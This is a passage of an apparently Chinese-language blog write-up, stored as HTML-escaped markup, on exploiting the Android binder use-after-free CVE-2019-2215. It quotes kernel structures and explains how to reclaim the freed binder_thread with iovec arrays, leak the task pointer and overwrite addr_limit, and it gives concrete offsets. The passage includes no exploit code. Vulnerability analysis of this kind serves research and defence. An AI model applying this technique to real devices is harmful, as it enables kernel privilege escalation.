+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* Wait structure used by the poll hooks */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;eppoll_entry&lt;/span&gt; {
+        &lt;span style=&#34;color:#75715e&#34;&gt;/* List header used to link this structure to the &amp;#34;struct epitem&amp;#34; */&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;list_head&lt;/span&gt; llink;
+
+        &lt;span style=&#34;color:#75715e&#34;&gt;/* The &amp;#34;base&amp;#34; pointer is set to the container &amp;#34;struct epitem&amp;#34; */&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;epitem&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;base;
+
+        &lt;span style=&#34;color:#75715e&#34;&gt;/*
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;        * Wait queue item that will be linked to the target file wait
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;        * queue head.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;        */&lt;/span&gt;
+        wait_queue_t wait;
+
+        &lt;span style=&#34;color:#75715e&#34;&gt;/* The wait queue head that linked the &amp;#34;wait&amp;#34; wait queue item */&lt;/span&gt;
+        wait_queue_head_t &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;whead;
+};
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;所以当最终走到&lt;code&gt;__list_del&lt;/code&gt;时，里面的unlink操作&lt;code&gt;next-&amp;gt;prev=prev&lt;/code&gt;通过构造一个虚假的binder_thread 对象在已经被free的binder_thread对应的地址处，就可以完成泄漏内存信息和关键数据修改。&lt;/p&gt;
+&lt;h3 id=&#34;21-preparing&#34;&gt;2.1 Preparing&lt;/h3&gt;
+&lt;p&gt;要做kernel里的堆布局，那就必须要对想要覆盖的结构体有足够的了解。这里先看一下&lt;code&gt;binder_thread&lt;/code&gt;的代码。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;17
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;18
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;19
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;20
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;21
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;22
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;23
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;24
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;25
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;26
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;27
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;28
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;29
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;30
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;31
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;32
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;33
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;34
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;35
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;36
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;37
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;38
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;39
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;40
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;41
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;42
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;43
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;44
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;45
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;46
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;47
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;48
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;49
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;50
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;51
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;52
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;53
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;54
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;55
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/**
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * struct binder_thread - binder thread bookkeeping
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * @proc:                 binder process for this thread
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *                        (invariant after initialization)
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * @rb_node:              element for proc-&amp;gt;threads rbtree
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *                        (protected by @proc-&amp;gt;inner_lock)
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * @waiting_thread_node:  element for @proc-&amp;gt;waiting_threads list
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *                        (protected by @proc-&amp;gt;inner_lock)
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * @pid:                  PID for this thread
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *                        (invariant after initialization)
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * @looper:               bitmap of looping state
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *                        (only accessed by this thread)
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * @looper_needs_return:  looping thread needs to exit driver
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *                        (no lock needed)
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * @transaction_stack:    stack of in-progress transactions for this thread
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *                        (protected by @proc-&amp;gt;inner_lock)
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * @todo:                 list of work to do for this thread
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *                        (protected by @proc-&amp;gt;inner_lock)
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * @process_todo:         whether work in @todo should be processed
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *                        (protected by @proc-&amp;gt;inner_lock)
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * @return_error:         transaction errors reported by this thread
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *                        (only accessed by this thread)
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * @reply_error:          transaction errors reported by target thread
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *                        (protected by @proc-&amp;gt;inner_lock)
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * @wait:                 wait queue for thread work
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * @stats:                per-thread statistics
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *                        (atomics, no lock needed)
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * @tmp_ref:              temporary reference to indicate thread is in use
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *                        (atomic since @proc-&amp;gt;inner_lock cannot
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *                        always be acquired)
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * @is_dead:              thread is dead and awaiting free
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *                        when outstanding transactions are cleaned up
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *                        (protected by @proc-&amp;gt;inner_lock)
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * @task:                 struct task_struct for this thread
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * Bookkeeping structure for binder threads.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;binder_thread&lt;/span&gt; {
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;binder_proc&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;proc;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rb_node&lt;/span&gt; rb_node;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;list_head&lt;/span&gt; waiting_thread_node;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; pid;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; looper;              &lt;span style=&#34;color:#75715e&#34;&gt;/* only modified by this thread */&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; looper_need_return; &lt;span style=&#34;color:#75715e&#34;&gt;/* can be written by other thread */&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;binder_transaction&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;transaction_stack;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;list_head&lt;/span&gt; todo;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; process_todo;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;binder_error&lt;/span&gt; return_error;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;binder_error&lt;/span&gt; reply_error;
+        wait_queue_head_t wait;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;binder_stats&lt;/span&gt; stats;
+        atomic_t tmp_ref;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; is_dead;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;task_struct&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;task;
+};
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这里我们需要注意的是整个binder_thread的size以及&lt;code&gt;wait&lt;/code&gt;和&lt;code&gt;task&lt;/code&gt;的偏移。因为最终我们的目的是构造一个和binder_thread类似size的内核变量去复用同一块内存，然后利用删除链表时对&lt;code&gt;wait&lt;/code&gt;的操作去获取&lt;code&gt;task&lt;/code&gt;的值，然后再次利用unlink去改写&lt;code&gt;addr_limit&lt;/code&gt;。通过调试，我们可以得到&lt;code&gt;binder_thread&lt;/code&gt;的size为&lt;strong&gt;0x198&lt;/strong&gt;, &lt;code&gt;wait&lt;/code&gt;的offset为&lt;strong&gt;0xA0&lt;/strong&gt;, &lt;code&gt;task&lt;/code&gt;的offset为&lt;strong&gt;0x190&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://blog.exiahan.com/images/cve20192215/binder_thread_infos.png&#34; alt=&#34;binder thread size&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;22-kernel-object-choosing&#34;&gt;2.2 Kernel Object Choosing&lt;/h3&gt;
+&lt;p&gt;为了能够成功复写被Free的binder_thread所在的内存区域，我们需要构造一个大小类似的内核结构或者对象，这里选用的是&lt;code&gt;struct iovec&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;4
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;5
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// sizeof(iovec) = 0x10
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;iovec&lt;/span&gt;
+{
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; __user &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;iov_base;
+        __kernel_size_t iov_len;
+};
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;通过使用&lt;code&gt;writev&lt;/code&gt;和&lt;code&gt;readv&lt;/code&gt;，可以用来向指定stream写入存储在不连续内存块（由iovsec[]定义）中的数据，或者从指定stream读出数据写入一些不连续的内存块中。其中&lt;code&gt;iov_base&lt;/code&gt;指定每个内存块的地址，&lt;code&gt;iov_len&lt;/code&gt;描述每个内存块的size。&lt;/p&gt;
+&lt;p&gt;使用iovec的其好处在于&lt;code&gt;iov_base&lt;/code&gt;和&lt;code&gt;iov_len&lt;/code&gt;都是可控的，只要绕过传入内核时对&lt;code&gt;iov_base&lt;/code&gt;做的是否在&lt;code&gt;userspace&lt;/code&gt;的校验，往后的任意修改都不会有&lt;code&gt;iov_base&lt;/code&gt;必须是指向userspace address的校验。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;17
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;18
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;19
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;20
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;21
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;22
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;task_struct&lt;/span&gt; {
+&lt;span style=&#34;color:#75715e&#34;&gt;#ifdef CONFIG_THREAD_INFO_IN_TASK
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;/*
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;        * For reasons of header soup (see current_thread_info()), this
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;        * must be the first element of task_struct.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;        */&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;thread_info&lt;/span&gt;      thread_info;
+        &lt;span style=&#34;color:#75715e&#34;&gt;#endif
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;/* -1 unrunnable, 0 runnable, &amp;gt;0 stopped: */&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;volatile&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;           state;
+        ...
+};
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;thread_info&lt;/span&gt; {
